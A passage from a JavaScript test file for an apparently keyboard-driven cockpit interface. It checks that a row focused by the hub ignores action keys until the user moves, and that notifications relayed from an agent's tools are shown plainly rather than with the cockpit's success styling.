      Object.assign(v, { message: () => ({ id: "m1", acts: [{ id: "archive", key: "b" }] }), flashes: { start() {} }, openReading() {} });
      v.focusOn("m1", cx, true);
      return v;
    },
    meetings: () => {
      const v = hub(Object.create(mod.Meetings.prototype));
      Object.assign(v, { meeting: () => ({ id: "e1", acts: [{ id: "prepare", key: "p" }] }), matches: () => true, open: new Set(), flashes: { start() {} } });
      v.focusOn("e1", cx, true);
      return v;
    },
    runbook: () => {
      const v = hub(Object.create(mod.Runbook.prototype));
      const step = { key: "eng-1#2", n: "2", step: "Deploy", open: true, acts: [{ id: "run", key: "r", confirm: "run" }] };
      Object.assign(v, { scope: "runbook", panel: false, filter: "", model: { books: [{ slug: "eng-1", name: "ENG-1", steps: [step], acts: [] }] }, picked: new Set(), flashes: { start() {} } });
      v.goTo({ key: "eng-1#2" }, cx, true);
      return v;
    },
    todo: () => {
      const v = hub(Object.create(mod.Todo.prototype));
      Object.assign(v, { item: () => ({ key: "k1", done: false }), items: () => [], matches: () => true, search: field() });
      v.goTo("k1", cx, true);
      return v;
    },
  };
  for (const [app, make] of Object.entries(apps)) {
    const v = make();
    assert.equal(v.pointed, true, `${app}: a hub focus points at the row`);
    const before = [acts.length, requests.length, calls.length];
    // Space only looks in the other apps; the to-do ticks an item with it.
    for (const keystroke of ["enter", "m", "f", "r", "b", "p", "x", "o", "t", "e", "shift-d", "a", "1", ...(app === "todo" ? ["space"] : [])]) {
      let took;
      try {
        took = v.key({ keystroke, key: keystroke }, cx);
      } catch (e) {
        assert.fail(`${app}: ${keystroke} reached the row (${e.message})`);
      }
      assert.equal(took, true, `${app}: ${keystroke} is held`);
    }
    await settled();
    assert.deepEqual([acts.length, requests.length, calls.length], before, `${app}: nothing ran`);
    assert.equal(v.confirm ?? v.dialog ?? null, null, `${app}: nothing armed`);
    assert.equal(v.toasts.msgs.at(-1), mod.MOVE_FIRST);
    assert.equal(mod.holds(v, { keystroke: "j" }), false);
    assert.equal(v.pointed, false, `${app}: a move makes the row the person's`);
  }
});

test("moved to after a hub focus, the row's own key acts", async () => {
  const { mod, requests } = await fixture({ shown: "monitor" });
  const { cx, settled } = context();
  const v = Object.create(mod.Monitor.prototype);
  Object.assign(v, { toasts: toasts(), handle: focus(), palette: null, confirm: null, filtering: false, model: { ready: true, apps: [{ key: "api", name: "api" }] }, closed: new Set(), opened: new Set(), filter: "",
    byKey: new Map([["api", { item: { key: "api", acts: [{ id: "fix", key: "f", action: "fix", args: ["api"] }] } }]]), select: (k) => (v.sel = k), move() {} });
  v.goTo("api", cx, true);
  v.key({ keystroke: "f" }, cx);
  await settled();
  assert.equal(requests.length, 0);
  v.key({ keystroke: "j" }, cx);
  v.key({ keystroke: "f" }, cx);
  await settled();
  assert.deepEqual(plain(requests.map((r) => [r.app, r.action])), [["monitor", "fix"]]);
  v.goTo("api", cx);
  assert.equal(v.pointed, false, "the person's own jump (the palette's Go to, a click) points at nothing");
});

test("a notification a client sent is drawn plain: never cockpit's icon nor the success its words claim", async () => {
  const { mod, notices } = await fixture();
  const { cx } = context();
  mod.deliver({ title: "✅ Tests passed", body: "api#9", action: "inbox:ENG-412" }, {}, cx);
  mod.deliver({ title: "From an agent's tools (app:t3): ✅ Tests passed", body: "api#9", action: "inbox:ENG-412", from: "an agent's tools (app:t3)" }, {}, cx);
  const [own, forged] = plain(notices);
  assert.equal(own.level, "success");
  assert.equal(own.icon, "mods/cockpit/cockpit.svg");
  assert.equal(forged.level, "info", "no success colour");
  assert.equal(forged.icon, undefined, "no cockpit icon");
  assert.equal(forged.title, "From an agent's tools (app:t3): ✅ Tests passed");
  assert.deepEqual(forged.action, { name: "cockpit.target:inbox:ENG-412" }, "its click still only brings the row into view");
});
